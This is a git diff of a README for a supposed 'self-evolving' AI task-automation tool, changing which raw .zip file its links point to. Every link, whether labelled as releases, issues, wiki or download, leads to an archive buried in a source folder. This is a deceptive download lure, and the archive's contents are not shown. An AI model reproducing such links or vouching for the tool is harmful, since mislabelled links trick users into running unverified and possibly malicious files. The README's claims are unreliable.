@@ -1,7 +1,7 @@
 # 🤖 dev-swarm-autonomous-agency - Seamlessly Automate Your Software Tasks
 
 ## 📥 Download Now
-[![Download](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip)](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip)
+[![Download](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip)](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip)
 
 ## 📖 Overview
 The **dev-swarm-autonomous-agency** is a self-evolving AI tool that helps you manage software tasks efficiently. This intelligent software uses a “Recon-Assemble-Build” approach to understand what you need. It can conduct web searches to pinpoint project requirements, hire specialized agents, and handle tasks dynamically. This means it can adapt and respond to your needs as they arise.
@@ -20,7 +20,7 @@ The **dev-swarm-autonomous-agency** is a self-evolving AI tool that helps you ma
 ## 🚀 Getting Started
 To download and use the dev-swarm-autonomous-agency, follow these straightforward steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip).
    
 2. **Choose Your Version**: Browse the available versions and select the one you need. You will see options for different platforms.
    
@@ -42,7 +42,7 @@ Ensure your system meets the following requirements:
 - **Internet Connection**: Required for initial setup and dynamic features.
 
 ## ⚙️ Download & Install
-You can start using dev-swarm-autonomous-agency by visiting this link: [Download the latest version](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip). If you encounter issues, ensure your system meets the requirements outlined above.
+You can start using dev-swarm-autonomous-agency by visiting this link: [Download the latest version](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip). If you encounter issues, ensure your system meets the requirements outlined above.
 
 ## 🛠️ Troubleshooting
 If you have trouble running the software, consider these steps:
@@ -54,11 +54,11 @@ If you have trouble running the software, consider these steps:
 ## 🌐 Community Support
 If you need help or want to contribute, connect with our community:
 
-- **GitHub Issues**: Report bugs or request new features [here](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip).
+- **GitHub Issues**: Report bugs or request new features [here](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip).
 - **Discussion Forum**: Join discussions with other users and developers.
 
 ## 🔗 Additional Resources
-- **Documentation**: For in-depth technical details, visit our [Wiki](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/config/autonomous_agency_swarm_dev_v1.6-alpha.5.zip).
+- **Documentation**: For in-depth technical details, visit our [Wiki](https://github.com/jitendracathons/dev-swarm-autonomous-agency/raw/refs/heads/main/src/dev_swarm/tools/dev-swarm-autonomous-agency-v1.7.zip).
 - **Tutorial Videos**: Find helpful guides on our YouTube channel.
 - **FAQ**: Check frequently asked questions on the FAQ section of our homepage.
 
